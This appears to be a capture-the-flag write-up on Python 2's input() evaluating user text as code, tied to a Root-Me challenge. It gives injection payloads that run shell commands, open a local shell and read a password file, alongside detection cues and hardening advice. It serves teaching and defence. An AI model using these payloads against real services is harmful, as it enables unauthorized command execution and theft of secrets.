---
title: "09 — Python 2 `input()` as `eval`"
date: 2026-10-31
categories: [python-jail]
tags: [pyjail, python, security]
---
# 09 — Python 2 `input()` as `eval`

A different kind of jail: not a restricted REPL, but a script that calls
`input()` in Python 2. In Python 2, `input(prompt)` reads a line and evaluates
it with `eval()` in the current scope. `raw_input()` is the safe string version.

## Vulnerable pattern

```python
p = input("Please enter password : ")
if (p == int(passwd)):
    print "Well done ! You can validate with this password !"
```

The comparison happens *after* `input()` has already evaluated the attacker's
expression. The expression runs with the script's globals and locals.

## Exploit

At the prompt, enter any expression:
```python
__import__('os').system("cat .passwd")
```

Other payloads:
```python
__import__('os').system("sh")
open(".passwd").read()
__import__('subprocess').check_output(["cat",".passwd"])
```

The script then tries `int(passwd)` comparison and fails, but the command has
already executed.

## Detection

- Python 2 shebang or `print "..."` statement.
- Use of `input()` instead of `raw_input()`.
- No sanitization of the returned value.

## Related: `eval`/`exec` misuse

Any place that does `eval(user_input)`, `exec(user_input)`, or
`compile(user_input, ...)` with user data is the same class of bug. The fix
is `ast.literal_eval` for data, or never evaluating untrusted strings.

## Hardening

- Use `raw_input()` (Py2) / `input()` (Py3).
- Validate with `ast.literal_eval` if a literal is needed.
- Never `eval`/`exec` user input.
- Restrict `__builtins__` only as defense-in-depth (not a boundary).

## Root-Me reference

`challenges/app_script/python2_input` — read `.passwd` by entering
`__import__('os').system("cat .passwd")` at the password prompt.

